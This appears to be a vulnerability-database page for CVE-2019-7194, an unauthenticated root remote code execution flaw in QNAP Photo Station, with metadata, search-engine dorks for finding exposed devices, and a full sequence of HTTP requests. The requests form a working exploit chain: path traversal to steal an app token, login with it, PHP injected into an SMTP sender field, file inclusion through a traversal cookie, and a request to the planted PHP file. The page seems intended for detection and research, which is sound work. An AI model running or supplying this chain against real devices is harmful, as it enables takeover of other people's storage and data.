---
layout: "post"
cve_id: "CVE-2019-7194"
title: "QNAP Photo Station < 6.0.3 - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2019/CVE-2019-7194.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-7194.yaml"
author: "x-stp"
severity: "critical"
impact: "Unauthenticated attackers can chain multiple vulnerabilities to achieve remote code execution with root privileges, gaining complete control over the QNAP device and access to all stored data.
"
remediation: "Upgrade to QNAP Photo Station version 6.0.3 or later.
"
reference:
  - "https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05"
classification: "{'cvss-score': 9.8, 'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cve-id': 'CVE-2019-7194', 'cwe-id': 'CWE-22', 'epss-score': 0.93938, 'epss-percentile': 0.99872, 'cpe': 'cpe:2.3:a:qnap:photo_station:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'vendor': 'qnap', 'product': 'photo_station', 'max-request': 10, 'intrusive': True, 'shodan-query': ['content-length:"580 "http server 1.0""', 'http.title:"photo station"', 'http.title:"qnap"'], 'fofa-query': ['title="photo station"', 'title="qnap"'], 'google-query': ['intitle:"photo station"', 'intitle:"qnap"']}"
tags:
  - "cve"
  - "cve2019"
  - "qnap"
  - "rce"
  - "photostation"
  - "unauth"
  - "injection"
  - "lfi"
  - "kev"
  - "intrusive"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
QNAP Photo Station versions prior to 6.0.3 contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE).


## ðŸŒ HTTP Request
```nohighlight
POST /photo/p/api/album.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

a=setSlideshow&f=qsamplealbum
```

```nohighlight
GET /photo/slideshow.php?album=64qQJc HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /photo/p/api/video.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 105
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

a=caption&f=UMGObv&album=64qQJc&ac=KZXtG7&filename=../../../../../share/Multimedia/.@__thumb/ps.app.token
```

```nohighlight
POST /cgi-bin/authLogin.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 41
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

app=PHOTO_STATION&auth=1&app_token=ucZZuO
```

```nohighlight
POST /cgi-bin/userConfig.cgi?sid=oNctx5 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
Connection: close
Content-Length: 195
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

func=addPersonalSmtp&provider_idx=0&sender=<?php echo php_uname(); unlink(__FILE__); ?>&default=0&smtp_server=0.0.0.0&port=25&security=-1&email_account=hswjsh@rhs94m.com&email_passwd=UsvHwznlb4bx
```

```nohighlight
GET /photo/slideshow.php?album=qsamplealbum HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Connection: close
Cookie: QMS_SID=../../../../../../../../../../mnt/ext/opt/photostation2/kflmko.php; PHPSESSID=pZYmce; NAS_SID=oNctx5; DESKTOP=1;
Accept-Encoding: gzip
```

```nohighlight
GET /photo/kflmko.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/620.32 (KHTML, like Gecko) Version/17.1.10 Safari/620.32
Connection: close
Cookie: PHPSESSID=pZYmce; NAS_SID=oNctx5
Accept-Encoding: gzip
```

